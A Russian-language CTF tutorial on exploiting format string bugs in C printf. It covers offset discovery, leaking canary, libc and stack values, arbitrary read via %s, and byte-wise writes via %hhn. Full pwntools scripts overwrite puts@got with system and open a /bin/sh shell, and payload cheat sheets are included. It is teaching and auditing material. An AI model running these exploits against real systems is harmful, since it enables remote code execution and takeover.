Format string — уязвимость, возникающая, когда пользовательский ввод передаётся напрямую в `printf`/`fprintf`/`snprintf` как строка формата. Спецификаторы `%p`, `%x`, `%s`, `%n` читают и пишут память по адресам из стека, что даёт произвольное чтение и запись. Это один из самых мощных userland-примитивов: при наличии format string можно утечь canary, libc, стек и перезаписать GOT.

## Как возникает уязвимость

```c
printf(buf);        // УЯЗВИМО: buf — пользовательский ввод
printf("%s", buf);  // безопасно: buf — аргумент
```

Если `buf` содержит `%p`, `printf` возьмёт «аргумент» из регистров/стека, где лежат чужие данные. Пользователь управляет форматом, поэтому может читать и писать произвольно.

## Основные спецификаторы

| Спецификатор | Действие |
|---|---|
| `%p` | печатает указатель (hex с `0x`) |
| `%x` | печатает hex (без `0x`) |
| `%s` | печатает строку по адресу-аргументу |
| `%n` | пишет число выведенных байт по адресу-аргументу |
| `%N$p` | N-й аргумент напрямую (позиционный) |
| `%N$hhn` | запись одного байта (short half) |
| `%Nc` | вывести N символов (для `%n`-записи) |
| `%N$s` | прочитать строку по N-му аргументу |

## Соглашение о вызовах и позиции аргументов

На amd64 первые 6 аргументов идут в rdi, rsi, rdx, rcx, r8, r9; остальные — на стеке. Но `printf` — вариадическая функция, и «аргументы» для спецификаторов берутся из регистров-сейв-области (`printf` сохраняет их на стеке), поэтому `%6$p` обычно указывает на первый стековый слот. Нумерация начинается с 1. Искать позиции нужно перебором:

```bash
for i in $(seq 1 40); do echo "AAAA %$i\$p"; done | ./chall
```

На 32-битных системах аргументы только на стеке, и позиции начинаются с 1 сразу после буфера.

## Поиск смещения до нашего буфера

Подайте `AAAA` и найдите, в какой позиции `%N$p` вернёт `0x41414141`:

```python
from pwn import *
p = process('./chall')
p.sendline(b'AAAA' + b'.%p'*20)
print(p.recvline())
# AAAA.0x7ffd... .0x7f... .0x41414141 ...  <- позиция найдена
```

Если `AAAA` появилось на позиции 7, то `%7$p` читает первые 4 байта нашего буфера. Тогда `%7$n` запишет по адресу, который мы туда положим.

## Утечка: canary, libc, стек

```python
from pwn import *
p = process('./chall')
p.sendline(b'%9$p')                # canary часто на 9-й позиции
canary = int(p.recvline(), 16)

p.sendline(b'%11$p')               # адрес libc
libc_leak = int(p.recvline(), 16)
libc.address = libc_leak - 0x29d90  # известный offset

p.sendline(b'%15$p')               # адрес стека
stack = int(p.recvline(), 16)
```

Позиции зависят от компилятора и глубины стека — подбирайте перебором. Утечка libc через format string обычно быстрее, чем ret2libc-цепочка.

## Запись через %n

`%n` записывает число уже выведенных символов. Чтобы записать конкретное значение, выводят нужное количество символов через `%Nc`. Для записи 8-байтового адреса удобно писать побайтово через `%hhn` (записывает 1 байт) — так обходят проблему огромных чисел.

```python
from pwn import *
p = process('./chall')
addr = elf.got['puts']
payload  = p64(addr) + p64(addr+1) + p64(addr+2) + p64(addr+3)
payload += f'%{libc.symbols["system"] & 0xff}c%6$hhn'.encode()
# и так далее для остальных байт
```

На практике используйте `fmtstr_payload`:

```python
from pwn import *
payload = fmtstr_payload(6, {elf.got['puts']: libc.symbols['system']})
p.sendline(payload)
```

`fmtstr_payload(offset, {addr: value}, numbwritten=0, write_size='byte'|'short'|'int')` автоматически собирает запись. Параметр `offset` — позиция нашего буфера (найденная выше).

## Захват GOT: system('/bin/sh')

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # утечка libc
    p.sendline(b'%11$p')
    libc.address = int(p.recvline(), 16) - 0x29d90
    log.success(f'libc @ {hex(libc.address)}')
    # запись system в puts@got
    p.sendline(fmtstr_payload(6, {elf.got['puts']: libc.symbols['system']}))
    # следующий вызов puts(x) -> system(x)
    p.sendline(b'/bin/sh')
    p.interactive()

exploit()
```

## Продвинутое: произвольное чтение

`%s` читает строку по адресу-аргументу. Положив адрес в буфер, можно прочитать произвольную память: `%7$s` прочитает строку по адресу из первых байт буфера. Так читают `environ` (утечка стека), GOT (адреса libc), содержимое флага в памяти.

```python
payload = p64(elf.got['puts']) + b'%7$s'
p.sendline(payload)
leak = p.recvuntil(b'\n')[:-1]
```

## Тонкости и подводные камни

- **Нулевые байты в адресе.** `printf` останавливается на `\x00` — адреса с нулевым байтом обрывают строку. Используйте частичную перезапись или размещайте адрес так, чтобы нули не мешали.
- **Порядок адресов.** `%hhn` пишет младший байт; адреса в payload идут по порядку записи.
- **Огромные числа.** `%1000000c` замедляет и переполняет вывод — пишите побайтово.
- **`printf` может буферизовать.** Используйте `sendlineafter` для синхронизации.
- **`%n` запрещён компилятором.** Формат-строки в коде компилируются с `-Wformat-security`; в задачах это осознанная уязвимость.
- **Позиция буфера меняется.** Найденная на 7 — не всегда на 7 при другом payload; перепроверяйте.

## Что дальше / решение

Дальше: `pwn-fs-advanced` (произвольная запись, обход фильтров), `pwn-got-plt` (цели записи), `pwn-canary-bypass` (утечка через `%p`). Практический алгоритм: (1) найдите позицию буфера перебором `%N$p`; (2) утеките canary/libc/стек позиционными `%N$p`; (3) соберите запись через `fmtstr_payload`; (4) запишите `system` в GOT или перезапишите `__stack_chk_fail`/`__free_hook`; (5) подайте `/bin/sh`. Format string — один из редких примитивов, дающих сразу и чтение, и запись; осваивайте его основательно.

## Обход фильтрации процента и длины

Некоторые программы экранируют `%` или ограничивают длину ввода. Приёмы: (1) если `%` запрещён, уязвимости нет — ищите другой примитив; (2) если ограничена длина, пишите побайтово через `%hhn` и сокращайте payload, размещая адреса компактно; (3) если запрещён `n`, используйте только чтение (`%p`/`%s`) для утечек. Иногда фильтр обходится через `%1$p` вместо `%p`, или через `%%`-экранирование в самом приложении.

## Чтение environ и адреса стека

Символ `environ` в libc указывает на массив переменных окружения на стеке. Прочитав его через `%s` (предварительно положив адрес `environ` в буфер), получают адрес стека. Это нужно для shellcode-инъекции на стек или для расчёта позиции сохранённого адреса возврата. Адрес `environ` = `libc.address + libc.symbols['environ']` (в современных glibc это смещение в libc).

## Полный эксплойт: от утечки до shell

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # 1) находим позицию буфера
    p.sendline(b'AAAA' + b'.%p'*15)
    line = p.recvline()
    off = [i for i, x in enumerate(line.split(b'.')) if b'41414141' in x]
    log.info(f'buffer offset = {off}')
    # 2) утечка libc
    p.sendline(b'%11$p')
    libc.address = int(p.recvline(), 16) - 0x29d90
    log.success(f'libc @ {hex(libc.address)}')
    # 3) запись system в puts@got
    p.sendline(fmtstr_payload(off[0], {elf.got['puts']: libc.symbols['system']}))
    # 4) вызов puts('/bin/sh') -> system('/bin/sh')
    p.sendline(b'/bin/sh')
    p.interactive()

exploit()
```

## Соглашение printf и почему позиции «плывут»

`printf` — вариадическая функция; на amd64 она сохраняет rdi-r9 и xmm-регистры в область сохранения на стеке, поэтому первые несколько позиций `%N$p` указывают на сохранённые регистры, а не на буфер. Позиция буфера зависит от глубины стека и компилятора, поэтому её всегда ищут эмпирически, а не угадывают. `pwntools` умеет автоматизировать: `FmtStr(exec_fmt)` перебирает позиции и находит offset сам.

## Расширенная таблица приёмов

| Задача | Приём |
|---|---|
| найти offset буфера | `AAAA.%p.%p...` |
| утечь canary | `%N$p` |
| утечь libc | `%N$p` на `__libc_start_main+...` |
| прочитать память | `%N$s` с адресом в буфере |
| записать 1 байт | `%Nc%M$hhn` |
| записать 8 байт | 4× `%hhn` |
| обойти фильтр `%` | нет обхода — другой примитив |

## Сводка

Format string — универсальный примитив: он даёт и чтение (`%p`, `%s`), и запись (`%n`, `%hhn`). Начните с поиска позиции буфера, затем утеките всё, что нужно (canary, libc, стек), затем через `fmtstr_payload` запишите `system` в GOT или перехватите `__stack_chk_fail`. Позиции аргументов подбираются эмпирически; pwntools `FmtStr` умеет находить offset автоматически. Даже одна уязвимая `printf(buf)` в программе с Partial RELRO обычно означает полный контроль.

## Мини-шпаргалка

| Цель | Payload |
|---|---|
| найти offset | `AAAA.%p.%p...` |
| утечь canary | `%9$p` |
| утечь libc | `%11$p` |
| прочитать память | `p64(addr) + b'%7$s'` |
| записать GOT | `fmtstr_payload(off, {got: val})` |
| авто-offset | `FmtStr(exec_fmt)` |

## Заключительное замечание

Format string опаснее многих других уязвимостей тем, что объединяет чтение и запись в одном примитиве и не требует переполнения. Даже единственная строка `printf(buf)` без проверок в программе с доступной записью в GOT означает полный контроль над потоком исполнения. При аудите кода ищите все вызовы семейства `printf`, где первым аргументом идёт пользовательская переменная, а не литерал формата.
